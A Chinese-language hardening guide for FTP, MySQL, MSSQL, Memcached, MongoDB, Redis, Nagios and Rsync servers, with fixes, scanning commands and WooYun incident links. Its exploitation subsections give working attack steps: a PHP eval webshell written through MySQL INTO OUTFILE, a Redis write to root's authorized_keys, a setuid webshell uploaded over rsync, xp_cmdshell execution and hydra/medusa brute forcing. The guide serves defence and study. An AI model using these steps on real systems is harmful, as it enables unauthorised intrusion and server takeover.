#服务配置
##FTP服务器安全配置

**1、FTP简介**
FTP 是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：“下载”（Download）和“上传”（Upload）。“下载”文件就是从远程主机拷贝文件至自己的计算机上；“上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。

**2、FTP服务器架设**

---
测试环境 centos 6.6，ftp选择vsftp

安装vsftpd

	yum install vsftpd -y
运行服务

	/etc/init.d/vsftpd -y
初始安装完成，初始安装完成后允许任意用户直接登录，可以下载其中的文件

**3、错误配置及利用**

---
***3.1 允许匿名用户直接登录,下载文件***

***3.2 配置不当存在弱口令***

***3.3 权限配置不当***

***3.4 proFTPd 未授权的文件拷贝(CVE-2015-3306)***

在proFTPd版本小于1.3.5的条件下，登陆proftp后(未授权或者爆破)，使用cpfr和cpto，能够拷贝主机中的文件，如果在知道web目录的绝对情况下，有可能写入webshell

具体攻击方法参考

[ProFTPd 1.3.5 - File Copy](http://zone.wooyun.org/content/19890)

**4、实际案例**

---
***4.1 FTP未授权访问***

[武汉科技大学某处FTP未授权访问](http://www.wooyun.org/bugs/wooyun-2010-0107341)

[中国海油FTP未授权导致大量数据泄露](http://www.wooyun.org/bugs/wooyun-2010-0105901)

***4.2 FTP弱口令***

[长虹FTP弱口令可导致全网数据泄漏](http://www.wooyun.org/bugs/wooyun-2010-0102552)

[KONKA康佳某系统服务器FTP弱口令](http://www.wooyun.org/bugs/wooyun-2010-0100787)

**5、修复方案**
修复方案使用vsftp的配置文件作为标准

***5.1 禁止匿名访问***

	vim /etc/vsftpd/vsftpd.conf
	anonymous_enable=NO
***5.2 增强口令强度***

避免弱口令

***5.3 进行访问限制***

使用iptables做ACL FTP分为主动式和被动式，书写防火墙规则是要注意

***5.3.1 主动式***

	iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
	iptables -A INPUT -p tcp  -m multiport --dport 20,21  -m state --state NEW -j ACCEPT
***5.3.2 被动式***

	vim /etc/modprobe.conf
	alias ip_conntrack ip_conntract_ftp ip_nat_ftp 
	vim /etc/rc.local
	/sbin/modprobe ip_conntract
	/sbin/modprobe ip_conntrack_ftp
	/sbin/modprobe ip_nat_ftp
假设vsftpd.conf中得相关配置如下

	pasv_enable=YES
	pasv_min_port=2222
	pasv_max_port=2225
防火墙规则可写为
	
	iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
	iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT
	iptables -A INPUT -p tcp --dport 2222:2225 -j ACCEPT

**6、漏洞扫描与发现**
先使用nmap对21端口的开放情况进行扫描，然后使用hydra或者medusa进行登陆验证或者暴力破解 端口扫描

	nmap -Pn -p21 ip
登陆验证或者端口扫描

	medusa -H ip.txt -U user.txt -P passwd.txt -M ftp
	#hydra不支持批量的导入
	hydra -L username.txt -P passwd.txt  ftp://ip
	
**7、相关资源**
[vsftpd官网](https://security.appspot.com/vsftpd.html)


##MySQL安全配置

**1、MySQL简介**

---
　　MySQL原本是一个开放源代码的关系数据库管理系统，原开发者为瑞典的MySQL AB公司，该公司于2008年被昇阳微系统（Sun Microsystems）收购。2009年，甲骨文公司（Oracle）收购昇阳微系统公司，MySQL成为Oracle旗下产品。

　　MySQL在过去由于性能高、成本低、可靠性好，已经成为最流行的开源数据库，因此被广泛地应用在Internet上的中小型网站中。随着MySQL的不断成熟，它也逐渐用于更多大规模网站和应用，比如维基百科、Google和Facebook等网站。非常流行的开源软件组合LAMP中的“M”指的就是MySQL。

　　但被甲骨文公司收购后，Oracle大幅调涨MySQL商业版的售价，且甲骨文公司不再支持另一个自由软件项目OpenSolaris的发展，因此导致自由软件社区们对于Oracle是否还会持续支持MySQL社区版（MySQL之中唯一的免费版本）有所隐忧，因此原先一些使用MySQL的开源软件逐渐转向其它的数据库。例如维基百科已于2013年正式宣布将从MySQL迁移到MariaDB数据库。

**2、MySQL服务器架设**

---
Mysql安装 从mysql官方下载地址中下载最新的release包。

		tar zxf mysql.tar.gz //编译源码
	 
	为mysql的运行建立mysql用户和mysql用户组
		groupadd mysql 
		useradd -g mysql mysql
		//进行mysql安装
		 ./configure --prefix=/usr/local/mysql
		make
		make install
		 
	cp support-files/my-medium.cnf /etc/my.cf //复制配置示例文件为配置文件
	mysql_install_db --user=mysql //用mysql生成初始数据库，出现类似thank for using mysql 证明初始化数据库成功。
	//用户目录权限限制
	chown -R root /mysql/  //修改mysql目录有者为root
	chown -R mysql /mysql/var //修改var目录所有者为mysql
	chgrp -R mysql //修改当前目录所属组为mysql
	bin/mysqld_safe --user=mysql & //启动mysql
	bin/mysql –u root //连接mysql
	 
	//修改root密码，此处示例将密码改成了"password"
	mysql> use mysql;
	mysql> update user set password=password('password') where user='root';
	mysql> flush privileges; //强制刷新内存授权表，否则用的还是在内存缓冲的口令
	//也可以使用 mysqladmin进行修改
	mysqladmin -u root password "upassword" //使用mysqladmin
	 
	//删除默认数据库和数据库用户
	mysql> show databases; //显示所有数据库
	mysql> drop database test; //删除默认数据库test
	use mysql; //进入mysql数据库
	delete from db; //删除存放数据库的表信息，因为还没有数据库信息。
	mysql> delete from user where not (user='root') ; // 删除初始非root的用户
	mysql> delete from user where user='root' and password=''; //删除空密码的root
	mysql> flush privileges; //强制刷新内存授权表。
	 
	//修改默认管理员账户
	mysql> update user set user="newroot" where user="root"; //将默认管理员root改成newroot
	mysql> flush privileges;
	 
	//使用mysql用户启动mysql
	mysqld_safe --user=mysql & //启动时指定用mysql用户启动(每次启动都要设置用mysql用户启动)
	//对my.cnf中的mysqld进行设置，如下：
	[mysqld]
	user=mysql
	 
	//禁止远程连接数据库
	//在my.cf中将#skip-networking的注释去掉
	mysqladmin -u root -p shutdown //停止数据库
	mysqld_safe --user=mysql & //用mysql用户启动mysql
	 
	//删除命令历史记录，建议在修改用户密码之后都要进行一次
	rm .bash_history .mysql_history  //删除历史记录
	ln -s /dev/null .bash_history   //将shell记录文件置空
	ln -s /dev/null .mysql_history  //将mysql记录文件置空
	 
	//禁止MySQL对本地文件存取
	//在my.cnf中添加local-infile=0,或者在启动mysql时加参数local-infile=0
	mysqld_safe --user=mysql --local-infile=0 &
	 
	//管理用户权限
	mysql>show grant //显示授权
	mysql>revoke delete on *.* from 'root' //移除root用户的delete权限
	Mysql的用户权限设置可参考Mysql安全配置根据实际需要给予所需的最低权限。

**3、错误配置及利用**

---
　　Mysql配置导致的漏洞往往都是多个因素共同造成的，最常见的就是网站中存在phpmyadmin等数据库管理工具或者Mysql允许远程连接，加上Mysql没有修改掉默认的用户或者使用了弱口令。这导致了攻击者使用其得到的用户权限进行数据库操作。若在配置Mysql时对用户权限进行了限制，则可大大减少因此遭受的损失。
　　在攻击者获取到Mysql数据库操作权限后，若服务器没有禁止MySQL对本地文件存取，那么攻击者可以通过写入shell，最终完全控制服务器。示例是将

	<?php eval($_REQUEST[cmd]);?>
写入到/www/shell.php文件中。

	mysql> select 0x3c3f706870206576616c28245f524551554553545b636d645d293b3f3e  into outfile '/www/shell.php'
	
**4、实际案例**

---
[多玩某站MYSQL弱口令](http://www.wooyun.org/bugs/wooyun-2010-0101070)

[暴走漫画某数据泄露可导致大量用户信息泄露](http://www.wooyun.org/bugs/wooyun-2010-0102165)

[某高校分站敏感信息泄露，且存在mysql弱口令](http://www.wooyun.org/bugs/wooyun-2010-0106104)

[自动化枚举系列#1 UC某服务弱口令导致可内网渗透](http://www.wooyun.org/bugs/wooyun-2010-042097)

**5、修复方案**

---
及时更新Mysql到最新版本，可在[mysql官方下载地址](http://www.mysql.com/downloads/)找到下载地址。

若Mysql配置中存在问题可参考本条目Mysql服务器架设。

**6、漏洞扫描及发现**

---
Mysql默认端口为3306，当数据库允许远程连接时该端口会对外开放。 通过对3306端口进行扫描就可以找到对外开放的Mysql服务器。

	//扫描
	nmap -n --open -p 3306 X.X.X.X/24
 
	//使用root用户和空口令连接Mysql服务器
	mysql -h X.X.X.X -u root
通过nmap扫描mysql相关的漏洞

	//检测mysql空口令
	nmap -p3306 --script=mysql-empty-password.nse 192.168.5.1
 
//检测nmap中支持扫描的所有MYSQL漏洞

	nmap -p3306 --script=mysql* 192.168.5.1
	
**7、相关资源**

---
[mysql官方网站](http://www.mysql.com/)

[mysql官方下载地址](http://www.mysql.com/downloads/)

[Mysql安全配置](http://drops.wooyun.org/tips/2245)

[MySQL安全配置详解](http://www.ha97.com/4092.html)

##MSSQL安全配置

**1、MSSQL简介**

---
Microsoft SQL Server是由美国微软公司所推出的关系数据库解决方案。 数据库的内置语言原本是采用美国标准局（ANSI）和国际标准组织（ISO）所定义的SQL语言，但是微软公司对它进行了部分扩充而成为作业用SQL（Transact-SQL）。

SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是Sybase，同时微软也和Sybase合作过SQL Server 4.2版本的研发，微软亦将SQL Server 4.2移植到Windows NT（当时为3.1版），在与Sybase终止合作关系后，自力开发出SQL Server 6.0版，往后的SQL Server即均由微软自行研发。

在与微软终止合作关系后，Sybase在Windows NT上的数据库产品原本称为Sybase SQL Server，后来改为现在的Sybase Adaptive Server Enterprise。

**2、MSSQL服务器架设**

---
Mssql试用版的下载地址可在[Mssql试用版官方下载地址](https://www.microsoft.com/zh-cn/server-cloud/products/sql-server/Try.aspx)找到。

Mssql的安装有使用安装向导进行安装还有使用命令行进行安装两种方法，具体安装方法请参见官方文档。

使用安装向导的请参见使用安装向导安装 [SQL Server 2012（安装程序）](https://technet.microsoft.com/zh-cn/library/ms143219(v=sql.110))。

使用命令行进行安装请参见从命令提示符安装 [SQL Server 2012](https://technet.microsoft.com/zh-cn/library/ms144259(v=sql.110))。

**3、错误配置及利用**

---
使用了旧版本的Mssql

Mssql并不是一款免费的数据库解决方案，许多网站所使用的都不是最新版本的Mssql数据库，这些旧版本中存在着许多公开的漏洞，威胁着服务器的安全。

sa用户弱口令且Mssql端口对外开放

Mssql默认端口为1433端口，当该端口对外开放时，攻击者便可尝试对Mssql的账号密码进行爆破，此时若服务器使用了常用的用户名（如administrator）或默认用户名（Mssql默认用户为sa）且密码为弱口令或者默认的空口令则极易造成服务器被攻击者登陆，并进一步利用。参考[MSSQL注射知识库 v 1.0](http://drops.wooyun.org/tips/1620)中MSSQL 2000密码破解部分的内容。在攻击者获取到Mssql服务器数据库操作权限的时候服务器中缺少对用户权限的限制就极易导致服务器沦陷，参考[MSSQL注射知识库 v 1.0](http://drops.wooyun.org/tips/1620)中Get WebShell和系统命令执行部分的内容。

启用了xp_cmdshell等危险扩展命令

Mssql中有许多类似于xp_cmdshell的扩展命令，当攻击者获取到Mssql的数据库操作权限时，这些扩展命令非常容易被攻击者利用，最终导致服务器沦陷。因此，在使用Mssql时应尽量禁用这些扩展命令。常被利用的扩展命令有

	Sp_OACreate
	Sp_OADestroy
	Sp_OAGetErrorInfo
	Sp_OAGetProperty
	Sp_OAMethod
	Sp_OASetProperty
	Sp_OAStop
	Xp_regaddmultistring
	Xp_regdeletekey
	Xp_regdeletevalue
	Xp_regenumvalues
	Xp_regremovemultistring
	xp_sdidebug
	xp_availablemedia
	xp_cmdshell
	xp_deletemail
	xp_dirtree
	xp_dropwebtask
	xp_dsninfo
	xp_enumdsn
	xp_enumerrorlogs
	xp_enumgroups
	xp_enumqueuedtasks
	xp_eventlog
	xp_findnextmsg
	xp_fixeddrives
	xp_getfiledetails
	xp_getnetname
	xp_grantlogin
	xp_logevent
	xp_loginconfig
	xp_logininfo
	xp_makewebtask
	xp_msver
	xp_perfend
	xp_perfmonitor
	xp_perfsample
	xp_perfstart
	xp_readerrorlog
	xp_readmail
	xp_revokelogin
	xp_runwebtask
	xp_schedulersignal
	xp_sendmail
	xp_servicecontrol
	xp_snmp_getstate
	xp_snmp_raisetrap
	xp_sprintf
	xp_sqlinventory
	xp_sqlregister
	xp_sqltrace
	xp_sscanf
	xp_startmail
	xp_stopmail
	xp_subdirs
	xp_unc_to_drive
	xp_dirtree
以下是使用xp_cmdshell执行系统命令的示例：

exec xp_cmdshell 'whoami'

**4、实际案例**

---
[四川烟草网MSSQL遇SA权限能执行0S-SHELL成功提权服务器（可内网渗透）](http://www.wooyun.org/bugs/wooyun-2015-0104036)

[用友协作办公平台再次通杀SQL注入](http://www.wooyun.org/bugs/wooyun-2014-061080)

[青岛科技大学某系统后台post注入](http://www.wooyun.org/bugs/wooyun-2010-0109828)

**5、修复方案**

---
使用了旧版本的Mssql

升级Mssql，或者使用其他的数据库解决方案。

sa用户弱口令且Mssql端口对外开放

/#查看口令为空的用户 

	SELECT * FROM sysusers
	SELECT name,Password FROM syslogins WHERE password IS NULL ORDER BY name
	 
/#更改口令

	USE master EXEC sp_password ‘旧口令’，‘新口令’,用户名

管理用户权限：

1. 企业管理器-〉数据库-〉对应数据库-〉角色-中创建新角色；
2. 调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、DRI权限

***启用了xp_cmdshell等危险扩展命令***

	#删除xp_cmdshell扩展命令，删除其它扩展命令同理
	USE master  sp_dropextendedproc 'xp_cmdshell'
	 
**6、漏洞扫描及发现**

---
Mssql默认端口为1433，当数据库允许远程连接时该端口会对外开放。 通过对1433端口进行扫描就可以找到对外开放的Mssql服务器。

	//扫描
	nmap -n --open -p 1433 X.X.X.X/24
 
	//使用nmap进行暴力破解
	nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.5.1
找到开放1433端口的服务器后便可尝试用Mssql数据库管理工具进行连接。

**7、相关资源**

---
[Mssql试用版官方下载地址](https://www.microsoft.com/zh-cn/server-cloud/products/sql-server/Try.aspx)

[使用安装向导安装 SQL Server 2012（安装程序）](https://technet.microsoft.com/zh-cn/library/ms143219(v=sql.110))

[从命令提示符安装 SQL Server 2012](https://technet.microsoft.com/zh-cn/library/ms144259(v=sql.110))

[SQL SERVER 2008安全配置](http://drops.wooyun.org/tips/1670)

[MSSQL注射知识库 v 1.0](http://drops.wooyun.org/tips/1620)


##Memcached安全配置

**1、Memcached简介**
Memcached是一个高性能的分布式的内存对象缓存系统，通过在内存里维护一个统一的巨大的hash表，它能够用来存储各种格式的数据，包括图像、视频、文件以及数据库检索的结果等。简单的说就是将数据调用到内存中，然后从内存中读取，从而大大提高读取速度。

Memcached是danga的一个项目，由LiveJournal的Brad Fitzpatrick开发，最初为了加速 LiveJournal 访问速度而开发的，后来被很多大型的网站采用。

Memcached是以守护程序方式运行于一个或多个服务器中，随时会接收客户端的连接和操作。

**2、Memcached服务器架设**
安装memcached服务端

	yum install memcached
安装php扩展操作memcached

	yum -y install php-pecl-memcache
查看php扩展是否安装成功

	php -m | grep memcache
启动memcached服务

	memcached -d -m 100 -u root -l x.x.x.x -p 11211 -c 512 -P /tmp/memcached.pid
参数说明：

	-d选项是启动一个守护进程；
	-m是分配给Memcache使用的内存数量，单位是MB，我这里是100MB；
	-u是运行Memcache的用户，我这里是root；
	-l是监听的服务器IP地址我这里指定了服务器的IP地址x.x.x.x；
	-p是设置Memcache监听的端口，我这里设置了11211，最好是1024以上的端口；
	-c选项是最大运行的并发连接数，默认是1024，我这里设置了512，按照你服务器的负载量来设定；
	-P是设置保存Memcache的pid文件，我这里是保存在 /tmp/memcached.pid；
结束memcached进程

	kill `cat /tmp/memcached.pid`
设置memcached开机启动

	chkconfig memcached on

**3、错误配置及利用**

---
Memcached服务器端都是直接通过客户端连接后直接操作，没有任何的验证过程，且Mecached默认以root权限运行。因而如果Mecached服务器直接暴露在互联网上的话是比较危险，轻则造成敏感数据泄露，重则可导致服务器被入侵。

	stats #显示memcached的运行状态
	version #显示版本号
	stats items #列出item
	add key 0 60 5 #增加一个item名为key，存活时间60s，大小为5字节
	12345 #key的值
	stats cachedump <item: id> <返回结果数量,0代表返回全部> #查看item信息
	get key #取得key的值
	delete key #删除key

**4、实际案例**

---
[WooYun: memcached未作IP限制导致缓存数据可被攻击者控制](http://www.wooyun.org/bugs/wooyun-2010-0790)

[WooYun: 通过Memcache缓存直接获取某物流网用户密码等敏感数据](http://www.wooyun.org/bugs/wooyun-2013-037301)

[WooYun: 56.com memcached端口可以远程使用](http://www.wooyun.org/bugs/wooyun-2013-023891)

**5、修复方案**

---
限定访问的IP

使用iptables限制访问IP,只允许IP为X.X.X.X的主机访问memcached：

	iptables -F
	iptables -P INPUT DROP
	iptables -A INPUT -p tcp -s X.X.X.X --dport 11211 -j ACCEPT
	iptables -A INPUT -p udp -s X.X.X.X --dport 11211 -j ACCEPT

**6、漏洞扫描与发现**

---
半手动扫描

memcache默认是11211端口，可使用nmap扫描服务器的11211端口：

	nmap -n --open -p 11211 X.X.X.X/24
	telnet X.X.X.X 11211
	stats items

**7、相关资源**

---
[memcached官网](http://memcached.org/)


##Mongodb安全配置

**1、Mongodb简介**

---
MongoDB是一种文件导向数据库管理系统，由C++撰写而成，以此来解决应用程序开发社区中的大量现实问题。2007年10月，MongoDB由10gen团队所发展。2009年2月首度推出。 Mongo DB ,是目前在IT行业非常流行的一种非关系型数据库(NoSql),其灵活的数据存储方式,备受当前IT从业人员的青睐。Mongo DB很好的实现了面向对象的思想(OO思想),在Mongo DB中 每一条记录都是一个Document对象。Mongo DB最大的优势在于所有的数据持久操作都无需开发人员手动编写SQL语句,直接调用方法就可以轻松的实现CRUD操作。 NoSQL数据库与传统的关系型数据库相比，它具有操作简单、完全免费、源码公开、随时下载等特点，并可以用于各种商业目的。这使NoSQL产品广泛应用于各种大型门户网站和专业网站，大大降低了运营成本。

**2、Mongodb服务器架设**

---
Mongodb安装：

Mongodb的安装、启动请参看：Install MongoDB

添加用户:

	use admin #进入admin数据库
		db.createUser(
		  {
		    user: "root",
		    pwd: "test",
		    roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
		  }
	) #添加用户名root，密码test的用户，若数据库未创建则会自动创建

**3、错误配置及利用**

---
MongoDB安装时不添加任何参数,默认是不开启权限验证的,登录的用户可以对数据库任意操作而且可以远程访问数据库。

在刚安装完毕的时候MongoDB都默认有一个admin数据库,此时admin数据库是空的,没有记录权限相关的信息。当admin.system.users一个用户都没有时，即使开启了权限验证,如果没有在admin数据库中添加用户,此时不进行任何认证还是可以做任何操作,直到在admin.system.users中添加了一个用户。

没有权限验证的MongoDB可被Mongodb管理工具（如：MongoVUE）远程匿名连接及进行数据库操作。

MongoDB的web界面存在漏洞，导致开启了web界面的MongoDB容易受到攻击，详见[Attacking MongoDB](http://drops.wooyun.org/papers/850)

**4、实际案例**

---
[百度某业务mongodb数据库未授权访问](http://www.wooyun.org/bugs/wooyun-2010-095976)

[酷我音乐MongoDB多个数据库未授权访问](http://www.wooyun.org/bugs/wooyun-2010-092643)

[酷狗繁星MongoDB数据库未授权访问](http://www.wooyun.org/bugs/wooyun-2010-092511)

**5、修复方案**

---
添加用户认证

MongoDB 3.0以上的版本较以往版本做了一些调整，如：

在安装完成后show dbs时只可以看到一个local数据库，而admin是不存在的，需要我们自己创建；
db.addUser(…)方法不再使用，添加用户需要使用db.createUser(…)方法等。
在3.0以上版本：

	use admin #进入admin数据库
	db.createUser(
	  {
	    user: "root",
	    pwd: "test",
	    roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
	  }
	) #添加用户名root，密码test的用户，若数据库未创建则会自动创建
注意：roles 中的 db 参数是必须的，不然会报错：

	Error: couldn’t add user: Missing expected field “db”。
这时我们就可以通过`show users`或`db.system.users.find()`命令看到刚才创建的用户了；

然后添加–auth参数（开启用户权限）重启MongoDB；

	use admin #进入admin数据库
	db.auth("root","test") #认证，成功返回1
注意：这里的root帐号只有用户管理权限！

因为帐号、密码是跟着数据库走的，所以我们需要为数据库设置账号密码，例如下面是给test数据库添加了一个有读写权限的账号为：

	use test #进入test数据库
	db.createUser(
	  {
	    user: "test",
	    pwd: "123456",
	    roles: [ { role: "readWrite", db: "test" } ]
	  }
) #添加用户名test，密码123456的帐号，若数据库未创建则会自动创建
限制连接IP

在启动时可以通过添加–bind_ip参数来绑定IP，如进行下面的绑定后则只能够从本机访问：

	./mongod --bind_ip 127.0.0.1
	
**6、漏洞扫描与发现**

---
半手动扫描

使用nmap扫描Mongodb默认的服务端口（27017）或者默认的web端口（28017）：

	nmap -n --open -p 27017 X.X.X.X/24
找到开放27017端口的主机后使用Mongodb管理工具（如：MongoVUE）进行连接。

**7、相关资源**

---
[mongodb官网](http://www.mongodb.org/)

[mongoDB 3.0 安全权限访问控制](http://ibruce.info/2015/03/03/mongodb3-auth/)

[mongodb官方教程](http://docs.mongodb.org/manual/)


##Redis安全配置

**1、Redis简介**

---
redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。从2013年5月开始，Redis的开发由Pivotal赞助。在这之前，其开发由VMware赞助。

**2、Redis服务架设**

---
下载源码并安装

	wget http://download.redis.io/releases/redis-2.8.7.tar.gz
	tar xzf redis-2.8.7.tar.gz 
	cd redis-2.8.7      
	make                
	make install   
	#拷贝配置文件       
	cp -p redis.conf /etc
直接执行，服务开启

	redis-server
初始安装后redis默认没有任何限制，可以任意连接，默认运行端口6379 按照指定的配置文件来运行

	redis-server /etc/redis.conf
如何连接redis 没有密码的

	nc ip port
	telnet ip port
	redis-cli -h ip -p port
有密码验证的

	redis-cli  -h ip -p port -a password
图形界面工具

	redis Client
	
**3、错误配置以及利用**

---
***3.1 未授权访问***

redis直接启动默认没有任何限制的，可以直接连接，查看,更改redis中的数据

***3.2 通过redis获取webshell***

假设redis用户运行在wooyun用户在，同时该服务器开放web服务，已知web目录的绝对路径(phpinfo,报错等等)，wooyun对web目录可以写入，则可以通过redis备份数据的过程写入shell

具体方法：[Redis-getshell](http://zone.wooyun.org/content/19358)

***3.3 通过redis获取服务器用户***

假设redis用户运行在root用户，root用户对自己的authorized_keys可以控制，可以直接通过备份来写入ssh key。

先在attack server生成一个公钥

	ssh-keygen -t rsa -C "redis"
	(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > redis.txt
然后执行

	redis-cli -h 192.168.192.133 flushall

	cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
	登录redis redis-cli -h 192.168.192.133

	CONFIG set dir /root/.ssh/
	config set dbfilename "authorized_keys"
	save
	exit
然后就可以使用ssh的私钥登录了
	
	ssh -i redis root@192.168.192.133
From:[redis-sshkey](http://zone.wooyun.org/content/23842)

**4、实际案例**

---
未授权访问案例：

[新浪redis数据库未授权访问（影响企业内部敏感信息）](http://www.wooyun.org/bugs/wooyun-2010-085110)

[聚美优品Redis未授权访问导致敏感信息泄露+跨境贸易报文交易系统弱口令](http://www.wooyun.org/bugs/wooyun-2010-083978)

[uc某redis配置不当导致uc共享wifi密钥泄露](http://www.wooyun.org/bugs/wooyun-2010-089090)

[熊猫翻滚redis服务可无密码远程访问导致敏感数据泄漏](http://www.wooyun.org/bugs/wooyun-2014-054740)

利用redis getshell案例：

[电信某服务器getshell可渗透内网（利用redis getshell案例）](http://www.wooyun.org/bugs/wooyun-2015-0101465)

利用redis写ssh key案例：

[中国铁建内网漫游沦陷多个重要部门泄漏大量信息(redis+ssh-keygen免认证登录案例)](http://www.wooyun.org/bugs/wooyun-2015-0152710)

**5、修复方案**

---
不要以root用户运行redis

修改运行redis的端口,编辑配置文件

	port 4321
如果只需要本地访问，编辑配置文件

	bind 127.0.0.1
设定密码,编辑配置文件

	requirepass 　wooyun.org
在启动的时候需要指定配置文件的路径，这些设置才会生效

	redis-server /etc/redis.conf
添加防火墙

	#注意设置INPUT的默认匹配规则为REJECT，否则该规则无意义
	iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 6379 -j ACCEPT

**6、漏洞扫描与发现**

---
使用nmap扫描redis的默认端口(6379)

	nmap -Pn -p6379 -sV x.x.x.x/24
手工验证

	nc ip 6379
后输入

	info
观察回显

批量验证未授权访问

首先获得开放redis的ip，python中存在redis模块，可以快速编程验证。

**7、相关资源**

---
[尝试通过HTTP请求攻击redis](http://drops.wooyun.org/papers/3062)

[zone中关于redis的讨论](http://zone.wooyun.org/content/19076)

[Redis命令参考](http://redis.readthedocs.org/en/latest/)

##Nagios安全配置

**1、Nagios简介**

---
Nagios是一款开源的免费网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。

**2、Nagios服务器假设**

---
具体的安装步骤参考官方文档：

[Nagios Documentation](http://www.nagios.org/documentation)

**3、错误配置及利用**

---
***3.1 弱口令***

***3.2 插件漏洞***

***3.2.1 NRPE远程命令执行***

NRPE是nagios用来检查其他节点的主机健康状态的插件，基本每个机器都会安装。它运行在TCP的5666端口，如果NRPE插件允许任何主机都来连接，在配置时允许自定义命令，同是版本小于等于2.15，则存在远程命令执行漏洞。

***3.2.2 其他插件漏洞***

具体参考：

[exploit-db nagios](https://www.exploit-db.com/search/?order_by=date&order=desc&pg=1&action=search&text=nagios)

**4、实际案例**

---
[新浪漏洞系列第五弹-sina nagios信息泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-022370)

**5、修复方案**

---
***5.1 修改弱口令***

***5.2 对于低版本的插件，进行升级或者设置ACL***

**6、漏洞扫描与发现**

---
**6.1 NPRE插件**

扫描端口

	nmap -Pn -p5666 --open x.x.x.x./24
再使用exp去检测

[NRPE 2.15 - Remote Code Execution Vulnerability](https://www.exploit-db.com/exploits/34461/)

**7、相关资源**

---
[nagios官网](http://www.nagios.org/)


##Rsync安全配置

**1、Rsync简介**

---
Rsync（remote synchronize）是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。

rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，提高其保密性。

此外，rsync是一款免费的软件。

rsync 包括如下的一些特性：

	能更新整个目录和树和文件系统。
	有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等。
	对于安装来说，无任何特殊权限要求。
	对于多个文件来说，内部流水线减少文件等待的延时。
	能用rsh、ssh 或直接端口做为传输入端口。
	支持匿名rsync 同步文件，是理想的镜像工具。
	
**2、Rsync服务器架设**

---
安装Rsync与xinetd包

	$ yum -y install xinetd rsync
确保xinetd运行在levels 3或4或5。

	$ chkconfig --level 345 xinetd on
修改rsync xinetd配置文件，把disable = yes改成disable = no

	$ vi /etc/xinetd.d/rsync
创建rsync的密码文件，格式 username:password

	$ vi /etc/rsyncd.secrets
创建rsync共享配置文件

	$ vi /etc/rsyncd.conf
添加如下内容：

	secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码
	#motd file = /etc/rsyncd.motd #欢迎信息文件名称和存放位置（此文件没有，可以自行添加）
	read only = no # yes只读 值为NO意思为可读可写模式，数据恢复用NO
	list = yes
	uid = nobody #以什么身份运行rsync
	gid = nobody
	 
	[out]  #模块名
	comment = Welcome #欢迎信息
	path = /home/rsync/out #rsync同步的路径
	auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。
	hosts allow = X.X.X.X #允许访问的IP
	auth users = username #/etc/rsyncd.secrets中的用户名
还有很多参数没有使用。 [rsyncd.conf](http://www.samba.org/ftp/rsync/rsyncd.conf.html)里详细解释了rsyncd.conf各个参数的意思。

修改权限与所有权，重启xinetd服务：

	$ chown root.root /etc/rsyncd.*
	$ chmod 600 /etc/rsyncd.*
	$ service xinetd restart
然后就可以通过如下命令访问了：

下载文件：

	./rsync -vzrtopg --progress --delete username@xxx.xxx.xxx.xxx::out /home/test/getfile
上传文件：

	/usr/bin/rsync -vzrtopg --progress /home/test/getfile username@xxx.xxx.xxx.xxx::out
Rsync 同步参数说明

	-vzrtopg里的v是verbose，z是压缩，r是recursive，topg都是保持文件原有属性如属主、时间的参数。
	--progress是指显示出详细的进度情况
	--delete参数会把原有getfile目录下的文件删除以保持客户端和服务器端文件系统完全一致
	username@xxx.xxx.xxx.xxx中的username是指定密码文件中的用户名,xxx为ip地址
out是指在rsyncd.conf里定义的模块名
	/home/test/getfile 是指本地要备份目录
如果不想每次都再输入一次密码可以使用–password-file参数
	
	/usr/bin/rsync -vzrtopg --progress /home/test/getfile  username@xxx.xxx.xxx.xxx
	::out --password-file=/test/rsyncd.secrets
本机上的/test/rsyncd.secrets文件里只需要保存密码即可，用户名已经在命令中有了，并且权限应为600。

**3、错误配置及利用**

---
rsync默认允许匿名访问,若未添加用户口令则可以进行匿名登录。 建议对rsync的IP访问进行限制以防止在用户口令被猜解或泄露时造成损失。

***常用的rsync操作：***

	rsync X.X.X.X:: #列出同步目录
	rsync X.X.X.X::www/ #列出同步目录中的www目录
	rsync -avz X.X.X.X::www/test.php /root #下载文件到本地
	rsync -avz X.X.X.X::www/ /var/tmp #下载目录到本地
	rsync -avz webshell.php X.X.X.X::www/ #上传本地文件到rsync服务器
***利用rsync提权***

rsync进程默认以root权限启动,利用rsync同步文件的同时，可以保持原来文件的权限的特性，可以使用rsync进行提权。

	chmod a+s webshell.php
	rsync -avz webshell.php X.X.X.X::www/
	
**4、实际案例**

---
[WooYun: 我是如何沦陷ChinaZ下载站服务器的，可登录3389、篡改源码等](http://www.wooyun.org/bugs/wooyun-2013-026232)

[WooYun: 新浪漏洞系列第三弹-微博内网遭入侵](http://www.wooyun.org/bugs/wooyun-2013-021589)

[WooYun: Discuz旗下5d6d某服务器Rsync任意文件上传](http://www.wooyun.org/bugs/wooyun-2012-010093)

